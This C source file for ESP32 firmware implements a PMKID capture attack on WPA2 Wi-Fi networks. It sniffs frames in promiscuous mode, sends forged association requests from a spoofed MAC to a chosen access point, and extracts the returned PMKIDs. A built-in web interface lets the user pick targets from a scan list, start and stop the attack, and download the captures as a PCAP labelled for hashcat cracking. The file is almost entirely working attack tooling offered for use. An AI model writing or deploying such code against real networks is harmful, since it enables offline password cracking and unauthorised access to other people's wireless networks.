#include "attack_pmkid.h"
#include "wifi_scan.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_event.h"
#include "frame_analyzer.h"
#include "pcap_serializer.h"
#include "main.h"
#include <string.h>
#include <stdio.h>

static const char *TAG = "PMKID";

static pmkid_status_t pmkid_status = {0};
static SemaphoreHandle_t status_mutex = NULL;
static TaskHandle_t pmkid_task_handle = NULL;
static pcap_buffer_t pcap_buf;

static uint8_t target_ap[6];
static uint8_t target_channel;
static char target_ssid[33];

static void pmkid_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;
    
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    
    if (is_pmkid_frame(pkt->payload, pkt->rx_ctrl.sig_len)) {
        uint8_t pmkid[16];
        if (extract_pmkid(pkt->payload, pkt->rx_ctrl.sig_len, pmkid)) {
            xSemaphoreTake(status_mutex, portMAX_DELAY);
            
            if (pmkid_status.count < MAX_PMKID_CAPTURES) {
                uint8_t ap_mac[6], sta_mac[6];
                get_packet_bssid(pkt->payload, ap_mac);
                get_packet_dst(pkt->payload, sta_mac);
                
                // Check if already captured
                bool exists = false;
                for (int i = 0; i < pmkid_status.count; i++) {
                    if (memcmp(pmkid_status.captures[i].pmkid, pmkid, 16) == 0) {
                        exists = true;
                        break;
                    }
                }
                
                if (!exists) {
                    memcpy(pmkid_status.captures[pmkid_status.count].ap_mac, ap_mac, 6);
                    memcpy(pmkid_status.captures[pmkid_status.count].sta_mac, sta_mac, 6);
                    memcpy(pmkid_status.captures[pmkid_status.count].pmkid, pmkid, 16);
                    strncpy(pmkid_status.captures[pmkid_status.count].ssid, target_ssid, 32);
                    pmkid_status.captures[pmkid_status.count].timestamp = xTaskGetTickCount() / 1000;
                    pmkid_status.captures[pmkid_status.count].valid = true;
                    pmkid_status.count++;
                    
                    // Add to PCAP
                    pcap_add_packet(&pcap_buf, pkt->payload, pkt->rx_ctrl.sig_len);
                    
                    ESP_LOGI(TAG, "PMKID captured! Total: %d", pmkid_status.count);
                }
            }
            
            xSemaphoreGive(status_mutex);
        }
    }
}

static void pmkid_attack_task(void *pvParameters) {
    ESP_LOGI(TAG, "PMKID attack started on channel %d", target_channel);
    
    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(pmkid_sniffer_cb);
    esp_wifi_set_promiscuous(true);
    
    // Prepare association request frame
    uint8_t assoc_req[128];
    int assoc_len = 0;
    
    // Frame control
    assoc_req[assoc_len++] = 0x00;  // Type: Management, Subtype: Association Request
    assoc_req[assoc_len++] = 0x00;
    assoc_req[assoc_len++] = 0x00;  // Duration
    assoc_req[assoc_len++] = 0x00;
    
    // Destination (AP)
    memcpy(&assoc_req[assoc_len], target_ap, 6);
    assoc_len += 6;
    
    // Source (random MAC)
    uint8_t src_mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};
    memcpy(&assoc_req[assoc_len], src_mac, 6);
    assoc_len += 6;
    
    // BSSID (AP)
    memcpy(&assoc_req[assoc_len], target_ap, 6);
    assoc_len += 6;
    
    // Sequence control
    assoc_req[assoc_len++] = 0x00;
    assoc_req[assoc_len++] = 0x00;
    
    // Capability info (0x0401 = ESS + Privacy)
    assoc_req[assoc_len++] = 0x01;
    assoc_req[assoc_len++] = 0x04;
    
    // Listen interval
    assoc_req[assoc_len++] = 0x0a;
    assoc_req[assoc_len++] = 0x00;
    
    // SSID IE
    assoc_req[assoc_len++] = 0x00;  // SSID element ID
    assoc_req[assoc_len++] = strlen(target_ssid);
    memcpy(&assoc_req[assoc_len], target_ssid, strlen(target_ssid));
    assoc_len += strlen(target_ssid);
    
    // Supported rates
    assoc_req[assoc_len++] = 0x01;  // Supported rates element ID
    assoc_req[assoc_len++] = 8;
    uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
    memcpy(&assoc_req[assoc_len], rates, 8);
    assoc_len += 8;
    
    // RSN IE (WPA2)
    assoc_req[assoc_len++] = 0x30;  // RSN element ID
    assoc_req[assoc_len++] = 20;    // Length
    assoc_req[assoc_len++] = 0x01;  // Version
    assoc_req[assoc_len++] = 0x00;
    assoc_req[assoc_len++] = 0x00;  // Group cipher: CCMP
    assoc_req[assoc_len++] = 0x0f;
    assoc_req[assoc_len++] = 0xac;
    assoc_req[assoc_len++] = 0x04;
    assoc_req[assoc_len++] = 0x01;  // Pairwise cipher count
    assoc_req[assoc_len++] = 0x00;
    assoc_req[assoc_len++] = 0x00;  // Pairwise cipher: CCMP
    assoc_req[assoc_len++] = 0x0f;
    assoc_req[assoc_len++] = 0xac;
    assoc_req[assoc_len++] = 0x04;
    assoc_req[assoc_len++] = 0x01;  // AKM count
    assoc_req[assoc_len++] = 0x00;
    assoc_req[assoc_len++] = 0x00;  // AKM: PSK
    assoc_req[assoc_len++] = 0x0f;
    assoc_req[assoc_len++] = 0xac;
    assoc_req[assoc_len++] = 0x02;
    assoc_req[assoc_len++] = 0x00;  // RSN capabilities
    assoc_req[assoc_len++] = 0x00;
    
    // Send association requests periodically
    while (pmkid_status.running) {
        esp_wifi_80211_tx(WIFI_IF_AP, assoc_req, assoc_len, false);
        
        xSemaphoreTake(status_mutex, portMAX_DELAY);
        pmkid_status.assoc_attempts++;
        xSemaphoreGive(status_mutex);
        
        vTaskDelay(pdMS_TO_TICKS(1000));
        
        // Stop if we got PMKID
        if (pmkid_status.count > 0) {
            ESP_LOGI(TAG, "PMKID captured, stopping attack");
            break;
        }
    }
    
    esp_wifi_set_promiscuous(false);
    pmkid_status.running = false;
    
    ESP_LOGI(TAG, "PMKID attack stopped");
    pmkid_task_handle = NULL;
    vTaskDelete(NULL);
}

void pmkid_attack_start(const uint8_t *ap_mac, uint8_t channel, const char *ssid) {
    if (pmkid_status.running) {
        ESP_LOGW(TAG, "PMKID attack already running");
        return;
    }
    
    if (!status_mutex) {
        status_mutex = xSemaphoreCreateMutex();
    }
    
    xSemaphoreTake(status_mutex, portMAX_DELAY);
    memset(&pmkid_status, 0, sizeof(pmkid_status));
    pmkid_status.running = true;
    xSemaphoreGive(status_mutex);
    
    memcpy(target_ap, ap_mac, 6);
    target_channel = channel;
    strncpy(target_ssid, ssid, 32);
    target_ssid[32] = '\0';
    
    pcap_init(&pcap_buf);
    
    xTaskCreate(pmkid_attack_task, "pmkid_task", 4096, NULL, 5, &pmkid_task_handle);
}

void pmkid_attack_stop(void) {
    if (!pmkid_status.running) return;
    
    pmkid_status.running = false;
    
    while (pmkid_task_handle != NULL) {
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    
    ESP_LOGI(TAG, "PMKID attack stopped");
}

bool pmkid_is_running(void) {
    return pmkid_status.running;
}

void pmkid_get_status(pmkid_status_t *status) {
    if (!status_mutex || !status) return;
    
    xSemaphoreTake(status_mutex, portMAX_DELAY);
    memcpy(status, &pmkid_status, sizeof(pmkid_status_t));
    xSemaphoreGive(status_mutex);
}

int pmkid_get_pcap(uint8_t **data) {
    return pcap_get_download(&pcap_buf, data);
}

esp_err_t pmkid_attack_handler(httpd_req_t *req) {
    stop_all_tools();
    
    char query[512];
    if (httpd_req_get_url_query_str(req, query, sizeof(query)) == ESP_OK) {
        if (strstr(query, "stop=1")) {
            pmkid_attack_stop();
            
            const char *resp = "<!DOCTYPE html><html><head>"
                "<meta http-equiv='refresh' content='1;url=/wifi_pmkid'>"
                "<style>body{background:#0a0f1c;color:#f5c542;text-align:center;padding:50px;}</style>"
                "</head><body><h1>✅ Attack Stopped</h1></body></html>";
            
            httpd_resp_send(req, resp, strlen(resp));
            return ESP_OK;
        }
        
        if (strstr(query, "download=1")) {
            uint8_t *pcap_data = NULL;
            int pcap_size = pmkid_get_pcap(&pcap_data);
            
            if (pcap_size > 0 && pcap_data) {
                httpd_resp_set_type(req, "application/vnd.tcpdump.pcap");
                httpd_resp_set_hdr(req, "Content-Disposition", "attachment; filename=\"pmkid.pcap\"");
                httpd_resp_send(req, (const char *)pcap_data, pcap_size);
                free(pcap_data);
                return ESP_OK;
            } else {
                const char *err = "<html><body>No PMKID data to download</body></html>";
                httpd_resp_send(req, err, strlen(err));
                return ESP_OK;
            }
        }
        
        if (strstr(query, "start=1")) {
            uint8_t ap_mac[6];
            uint8_t channel = 1;
            char ssid[33] = "";
            
            char *ap_param = strstr(query, "ap=");
            char *ch_param = strstr(query, "channel=");
            char *ssid_param = strstr(query, "ssid=");
            
            if (ap_param) {
                sscanf(ap_param + 3, "%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx",
                    &ap_mac[0], &ap_mac[1], &ap_mac[2], &ap_mac[3], &ap_mac[4], &ap_mac[5]);
            }
            if (ch_param) channel = atoi(ch_param + 8);
            if (ssid_param) {
                // URL decode SSID
                int i = 0, j = 0;
                char *s = ssid_param + 5;
                while (s[i] && j < 32 && s[i] != '&') {
                    if (s[i] == '+') ssid[j++] = ' ';
                    else if (s[i] == '%' && s[i+1] && s[i+2]) {
                        char hex[3] = {s[i+1], s[i+2], 0};
                        ssid[j++] = strtol(hex, NULL, 16);
                        i += 2;
                    } else {
                        ssid[j++] = s[i];
                    }
                    i++;
                }
                ssid[j] = '\0';
            }
            
            pmkid_attack_start(ap_mac, channel, ssid);
            
            const char *resp = "<!DOCTYPE html><html><head>"
                "<meta http-equiv='refresh' content='1;url=/wifi_pmkid'>"
                "<style>body{background:#0a0f1c;color:#f5c542;text-align:center;padding:50px;}</style>"
                "</head><body><h1>⚡ PMKID Attack Started</h1></body></html>";
            
            httpd_resp_send(req, resp, strlen(resp));
            return ESP_OK;
        }
    }
    
    // Generate UI
    bool is_running = pmkid_is_running();
    pmkid_status_t status;
    pmkid_get_status(&status);
    
    ap_with_clients_t scan_results[20];
    int scan_count = wifi_scan_get_results(scan_results, 20);
    
    char *page = malloc(32768);
    if (!page) {
        const char *err = "<html><body>Memory Error</body></html>";
        httpd_resp_send(req, err, strlen(err));
        return ESP_FAIL;
    }
    
    const char *auto_refresh = is_running ? "<meta http-equiv='refresh' content='3'>" : "";
    
    int offset = 0;
    offset += snprintf(page + offset, 32768 - offset,
        "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1'>%s"
        "<title>PMKID Attack</title><style>"
        "body{background:#0a0f1c;color:#f5c542;font-family:sans-serif;margin:0;padding:20px;}"
        "h1,h2{text-align:center;color:#f5c542;}h2{border-bottom:2px solid #f5c542;padding-bottom:5px;}"
        ".container{max-width:900px;margin:0 auto;}"
        ".status{padding:15px;margin:20px 0;border-radius:8px;text-align:center;font-weight:bold;}"
        ".status.running{background:#ff8800;color:#000;}"
        ".status.stopped{background:#44ff44;color:#0a0f1c;}"
        ".status.success{background:#44ff44;color:#0a0f1c;}"
        ".control{background:#1a1f2c;padding:20px;border-radius:8px;margin:20px 0;}"
        "label{display:block;margin:10px 0 5px;font-weight:bold;}"
        "input,select{width:100%%;padding:10px;border-radius:5px;border:2px solid #f5c542;"
        "background:#0a0f1c;color:#f5c542;margin-bottom:15px;box-sizing:border-box;}"
        ".btn{display:inline-block;padding:12px 20px;margin:10px 5px;background:#f5c542;"
        "color:#0a0f1c;text-decoration:none;font-weight:bold;border-radius:8px;border:none;cursor:pointer;}"
        ".btn:hover{background:#d4a017;}.btn.danger{background:#ff4444;color:white;}"
        ".btn.success{background:#44ff44;color:#0a0f1c;}.btn.full{width:100%%;box-sizing:border-box;}"
        "table{width:100%%;border-collapse:collapse;margin:10px 0;}"
        "th,td{padding:8px;border:1px solid #f5c542;text-align:left;font-size:0.9em;}"
        "th{background:#1a1f2c;}.pmkid{font-family:monospace;font-size:0.85em;word-break:break-all;}"
        "tr:hover{background:#1a1f2c;cursor:pointer;}"
        ".info{background:#1a1f2c;padding:15px;border-radius:8px;margin:20px 0;border-left:4px solid #f5c542;}"
        ".stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:20px 0;}"
        ".stat-box{background:#1a1f2c;padding:15px;border-radius:8px;text-align:center;}"
        ".stat-value{font-size:2em;font-weight:bold;color:#f5c542;}"
        "</style>"
        "<script>function selectAP(b,c,s){document.getElementById('ap').value=b;"
        "document.getElementById('channel').value=c;document.getElementById('ssid').value=s;}</script>"
        "</head><body><div class='container'>"
        "<h1>🔑 PMKID Capture Attack</h1>",
        auto_refresh);
    
    if (is_running) {
        offset += snprintf(page + offset, 32768 - offset,
            "<div class='status running'>🟠 ATTACK IN PROGRESS</div>"
            "<div class='stats'>"
            "<div class='stat-box'><div class='stat-value'>%lu</div><div>Association Attempts</div></div>"
            "<div class='stat-box'><div class='stat-value'>%d</div><div>PMKIDs Captured</div></div>"
            "</div>"
            "<div class='control'><a href='/wifi_pmkid?stop=1' class='btn danger full'>⏹ Stop Attack</a></div>",
            status.assoc_attempts, status.count);
    } else {
        if (status.count > 0) {
            offset += snprintf(page + offset, 32768 - offset,
                "<div class='status success'>✅ PMKID CAPTURED (%d)</div>"
                "<div class='control'>"
                "<a href='/wifi_pmkid?download=1' class='btn success full'>💾 Download PCAP (for hashcat)</a>"
                "</div>", status.count);
        } else {
            offset += snprintf(page + offset, 32768 - offset,
                "<div class='status stopped'>🟢 Ready</div>");
        }
        
        offset += snprintf(page + offset, 32768 - offset,
            "<div class='info'><strong>ℹ️ About PMKID:</strong> "
            "This attack captures the PMKID from WPA2 handshakes, which can be cracked offline with hashcat. "
            "More efficient than capturing full 4-way handshakes.</div>"
            "<div class='control'><h2>Launch Attack</h2>"
            "<form action='/wifi_pmkid' method='get'>"
            "<label>Target AP (BSSID):</label>"
            "<input type='text' id='ap' name='ap' placeholder='AABBCCDDEEFF' pattern='[A-Fa-f0-9]{12}' required>"
            "<label>SSID:</label>"
            "<input type='text' id='ssid' name='ssid' placeholder='NetworkName' required>"
            "<label>Channel:</label>"
            "<select id='channel' name='channel'>");
        
        for (int i = 1; i <= 13; i++) {
            offset += snprintf(page + offset, 32768 - offset,
                "<option value='%d'%s>Channel %d</option>", i, i == 6 ? " selected" : "", i);
        }
        
        offset += snprintf(page + offset, 32768 - offset,
            "</select><input type='hidden' name='start' value='1'>"
            "<button type='submit' class='btn full'>▶ Start PMKID Capture</button></form></div>");
        
        if (scan_count > 0) {
            offset += snprintf(page + offset, 32768 - offset,
                "<h2>📡 Select Target Network</h2>"
                "<table><tr><th>SSID</th><th>BSSID</th><th>CH</th><th>Auth</th></tr>");
            
            for (int i = 0; i < scan_count && offset < 30000; i++) {
                char bssid[13];
                snprintf(bssid, sizeof(bssid), "%02X%02X%02X%02X%02X%02X",
                    scan_results[i].ap.bssid[0], scan_results[i].ap.bssid[1],
                    scan_results[i].ap.bssid[2], scan_results[i].ap.bssid[3],
                    scan_results[i].ap.bssid[4], scan_results[i].ap.bssid[5]);
                
                const char *ssid_str = strlen((char *)scan_results[i].ap.ssid) > 0 ? 
                    (char *)scan_results[i].ap.ssid : "hidden";
                
                const char *auth = "OPEN";
                if (scan_results[i].ap.authmode == WIFI_AUTH_WPA2_PSK) auth = "WPA2";
                else if (scan_results[i].ap.authmode == WIFI_AUTH_WPA3_PSK) auth = "WPA3";
                
                offset += snprintf(page + offset, 32768 - offset,
                    "<tr onclick=\"selectAP('%s',%d,'%s')\"><td>%s</td><td>%c%c:%c%c:%c%c:%c%c:%c%c:%c%c</td><td>%d</td><td>%s</td></tr>",
                    bssid, scan_results[i].ap.primary, ssid_str, ssid_str,
                    bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
                    bssid[6],bssid[7],bssid[8],bssid[9],bssid[10],bssid[11],
                    scan_results[i].ap.primary, auth);
            }
            offset += snprintf(page + offset, 32768 - offset, "</table>");
        }
    }
    
    if (status.count > 0) {
        offset += snprintf(page + offset, 32768 - offset,
            "<h2>🎯 Captured PMKIDs</h2><table>"
            "<tr><th>SSID</th><th>AP MAC</th><th>PMKID</th><th>Time</th></tr>");
        
        for (int i = 0; i < status.count && offset < 30000; i++) {
            char pmkid_hex[64] = "";
            for (int j = 0; j < 16; j++) {
                sprintf(pmkid_hex + strlen(pmkid_hex), "%02x", status.captures[i].pmkid[j]);
            }
            
            offset += snprintf(page + offset, 32768 - offset,
                "<tr><td>%s</td><td>%02X:%02X:%02X:%02X:%02X:%02X</td><td class='pmkid'>%s</td><td>%lus ago</td></tr>",
                status.captures[i].ssid,
                status.captures[i].ap_mac[0], status.captures[i].ap_mac[1],
                status.captures[i].ap_mac[2], status.captures[i].ap_mac[3],
                status.captures[i].ap_mac[4], status.captures[i].ap_mac[5],
                pmkid_hex,
                (xTaskGetTickCount() / 1000) - status.captures[i].timestamp);
        }
        offset += snprintf(page + offset, 32768 - offset, "</table>");
    }
    
    offset += snprintf(page + offset, 32768 - offset,
        "<div style='text-align:center;margin-top:30px;'>"
        "<a href='/' class='btn'>⬅ Back</a></div></div></body></html>");
    
    httpd_resp_set_type(req, "text/html");
    httpd_resp_send(req, page, strlen(page));
    free(page);
    
    return ESP_OK;
}